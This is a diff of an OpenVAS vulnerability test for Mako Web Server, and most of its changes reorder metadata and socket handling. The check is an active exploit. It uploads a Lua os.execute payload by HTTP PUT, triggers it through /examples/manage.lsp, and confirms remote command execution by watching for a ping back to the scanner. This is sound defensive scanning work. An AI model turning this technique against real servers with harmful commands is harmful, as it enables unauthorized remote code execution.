@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_mako_web_server_mult_vuln.nasl 10055 2018-06-04 04:44:00Z ckuersteiner $
+# $Id: gb_mako_web_server_mult_vuln.nasl 10322 2018-06-26 06:37:28Z cfischer $
 #
 # Mako Web Server Multiple Vulnerabilities
 #
@@ -29,15 +29,23 @@ CPE = "cpe:/a:mako:mako_web_server";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.811771");
-  script_version("$Revision: 10055 $");
+  script_version("$Revision: 10322 $");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2018-06-04 06:44:00 +0200 (Mon, 04 Jun 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-06-26 08:37:28 +0200 (Tue, 26 Jun 2018) $");
   script_tag(name:"creation_date", value:"2017-09-18 16:33:01 +0530 (Mon, 18 Sep 2017)");
-  script_tag(name:"qod_type", value:"exploit");
   script_name("Mako Web Server Multiple Vulnerabilities");
+  script_category(ACT_ATTACK);
+  script_copyright("Copyright (C) 2017 Greenbone Networks GmbH");
+  script_family("Web application abuses");
+  script_dependencies("gb_mako_web_server_detect.nasl", "os_detection.nasl");
+  script_mandatory_keys("Mako/WebServer/installed");
+  script_require_ports("Services/www", 9357, 80, 443);
 
-  script_tag(name: "summary" , value:"The host is running Mako Web Server and
+  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/42683");
+  script_xref(name:"URL", value:"https://blogs.securiteam.com/index.php/archives/3391");
+
+  script_tag(name:"summary", value:"The host is running Mako Web Server and
   is prone to multiple vulnerabilities.");
 
   script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and check
@@ -68,19 +76,11 @@ if(description)
   may also be affected.");
 
   script_tag(name:"solution", value:"No known solution is available as of 04th June, 2018. Information regarding
-this issue will be updated once solution details are available.");
+  this issue will be updated once solution details are available.");
 
   script_tag(name:"solution_type", value:"NoneAvailable");
+  script_tag(name:"qod_type", value:"exploit");
 
-  script_xref(name: "URL", value: "http://www.exploit-db.com/exploits/42683");
-  script_xref(name: "URL", value: "https://blogs.securiteam.com/index.php/archives/3391");
-
-  script_category(ACT_ATTACK);
-  script_copyright("Copyright (C) 2017 Greenbone Networks GmbH");
-  script_family("Web application abuses");
-  script_dependencies("gb_mako_web_server_detect.nasl", "os_detection.nasl");
-  script_mandatory_keys("Mako/WebServer/installed");
-  script_require_ports("Services/www", 9357, 80, 443);
   exit(0);
 }
 
@@ -93,24 +93,16 @@ if(!makoPort = get_app_port(cpe:CPE)){
   exit(0);
 }
 
-soc = open_sock_tcp(makoPort);
-if(!soc){
-  exit(0);
-}
+host = http_host_name(port:makoPort);
 
-if(host_runs("Windows") == "yes")
-{
+if(host_runs("Windows") == "yes"){
   CMD = "os.execute('ping -n 5 " + this_host() + "')";
   win = TRUE;
-}
-else
-{
+}else{
   check = "__OpenVAS__" + rand_str(length:4);
   pattern = hexstr(check);
   CMD = "os.execute('ping -c 5 -p " + pattern + " " + this_host() + "')" ;
 }
-
-host = http_host_name(port:makoPort);
 
 len = strlen(CMD);
 if(!len){
@@ -122,10 +114,14 @@ req = string("PUT ", url, " HTTP/1.1\r\n",
           "Content-Length: ", len, "\r\n",
           "Host: ", host, "\r\n",
           "\r\n", CMD);
-
 res = http_keepalive_send_recv(port:makoPort, data:req);
-if(res =~ "204 No Content" && "Server: MakoServer.net" >< res)
-{
+if(res =~ "204 No Content" && "Server: MakoServer.net" >< res){
+
+  soc = open_sock_tcp(makoPort);
+  if(!soc){
+    exit(0);
+  }
+
   url = "/examples/manage.lsp?execute=true&ex=openVASTest&type=lua";
 
   req = string("GET ", url, " HTTP/1.1\r\n",
@@ -135,15 +131,12 @@ if(res =~ "204 No Content" && "Server: MakoServer.net" >< res)
                       data:req,
                       timeout:2,
                       pcap_filter: string( "icmp and icmp[0] = 8 and dst host ", this_host(), " and src host ", get_host_ip() ) );
-
-  if(res && (win || check >< res))
-  {
+  close(soc);
+  if(res && (win || check >< res)){
     report = "It was possible to execute command remotely at " + report_vuln_url( port:makoPort, url:url, url_only:TRUE ) + " with the command '" + CMD + "'.";
     security_message( port:makoPort, data:report);
-    close(soc);
     exit(0);
   }
 }
 
-close(soc);
 exit(99);
